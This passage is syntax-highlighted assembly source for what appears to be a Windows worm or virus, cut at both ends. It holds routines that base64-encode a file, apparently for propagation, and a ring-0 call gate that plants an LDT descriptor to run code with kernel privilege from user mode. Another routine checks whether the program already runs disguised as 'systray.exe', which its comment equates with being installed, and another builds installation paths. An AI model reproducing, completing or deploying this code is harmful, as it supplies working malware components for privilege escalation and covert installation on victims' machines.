        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0xC0000000</span><span class="sc0">      </span><span class="sc1">; GENERIC_READ | GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; pad the file with [0,2] zeroes</span><span class="sc0">
        </span><span class="sc1">; add [0,2] to file size</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00000003</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; remainder 0 ? (div by 3?)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad_no</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.size_ok</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad_no</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">; dwBufSize = dwFileSize * 3 (base64 may be 3 times bigger then the original)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00000003</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwBufSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.fixed_size</span><span class="sc0">

</span><span class="sc5">.size_ok</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00000003</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwBufSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">.fixed_size</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; alloc some memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000004</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00001000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwBufSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualAlloc</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.pass_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc5">.pass_1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_addr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; create file mapping</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000004</span><span class="sc0">        </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; map view of file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000002</span><span class="sc0">        </span><span class="sc1">; FILE_MAP_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pMap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad_no</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.size_ok_2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">.loop_2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.loop_2</span><span class="sc0">

</span><span class="sc5">.size_ok_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; start encoding</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pMap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pad_no</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encTable</span><span class="sc0">

</span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pMap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">tempFileName</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFileA</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Close encode (free allocated memory)</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">close_encode</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00008000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualFree</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Ring 0 Callgate</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CGS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">callgate</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sldt</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF8</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CGS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEC000028</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0x9A</span><span class="sc0">        </span><span class="sc1">; call 28:&lt;esi&gt;</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; unused</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">CGS</span><span class="sc4">+</span><span class="sc2">100b</span><span class="sc4">+</span><span class="sc2">11b</span><span class="sc0">    </span><span class="sc1">; LDT+R3</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Check if systray</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">check_systray</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; check if in the name already exists 'systray.exe' witch means</span><span class="sc0">
        </span><span class="sc1">; it is already installed in the system</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">my_path</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">systray_exe</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systray_exe_len</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systray_exe_len</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">.systray_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncmpi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.not_systray</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.systray_again</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.systray</span><span class="sc0">

</span><span class="sc5">.not_systray</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systray_ornot</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">.systray</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systray_ornot</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Make paths for use in installation etc.</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">make_paths</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
